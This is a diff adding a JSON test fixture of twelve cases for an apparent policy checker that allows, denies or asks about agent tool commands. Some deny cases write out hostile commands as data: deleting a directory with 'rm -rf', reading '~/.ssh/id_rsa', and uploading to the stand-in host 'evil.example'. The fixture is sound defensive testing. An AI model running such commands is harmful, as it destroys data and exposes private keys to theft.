@@ -1,0 +1,14 @@
+[
+  {"name":"safe-go-test","expected_decision":"allow","request":{"tool_name":"workspace_exec","command":"go test ./...","backend":"workspaceexec","timeout_seconds":30,"max_output_bytes":1048576,"environment":{"PATH":"/usr/bin"}}},
+  {"name":"dangerous-delete","expected_decision":"deny","request":{"tool_name":"host_exec","command":"rm -rf /tmp/project","backend":"hostexec"}},
+  {"name":"read-key","expected_decision":"deny","request":{"tool_name":"workspace_exec","command":"cat ~/.ssh/id_rsa","backend":"workspaceexec"}},
+  {"name":"network-denied","expected_decision":"deny","request":{"tool_name":"workspace_exec","command":"curl https://evil.example/upload","backend":"workspaceexec"}},
+  {"name":"network-allowed","expected_decision":"allow","request":{"tool_name":"workspace_exec","command":"curl https://api.github.com/repos/openai/openai","backend":"workspaceexec"}},
+  {"name":"shell-wrapper","expected_decision":"ask","request":{"tool_name":"host_exec","command":"bash -c echo-safe","backend":"hostexec"}},
+  {"name":"pipeline","expected_decision":"ask","request":{"tool_name":"workspace_exec","command":"git status | head","backend":"workspaceexec"}},
+  {"name":"dependency-install","expected_decision":"ask","request":{"tool_name":"code_exec","command":"go install example.com/untrusted@latest","backend":"codeexec"}},
+  {"name":"long-running","expected_decision":"ask","request":{"tool_name":"workspace_exec","command":"sleep 120","backend":"workspaceexec"}},
+  {"name":"large-output","expected_decision":"deny","request":{"tool_name":"code_exec","command":"echo data","backend":"codeexec","max_output_bytes":9999999}},
+  {"name":"host-pty","expected_decision":"ask","request":{"tool_name":"host_exec","command":"go test ./...","backend":"hostexec","pty":true}},
+  {"name":"manual-review","expected_decision":"ask","request":{"tool_name":"workspace_exec","command":"custom-linter ./...","backend":"workspaceexec","environment":{"UNREVIEWED_TOKEN":"token=abc123"}}}
+]
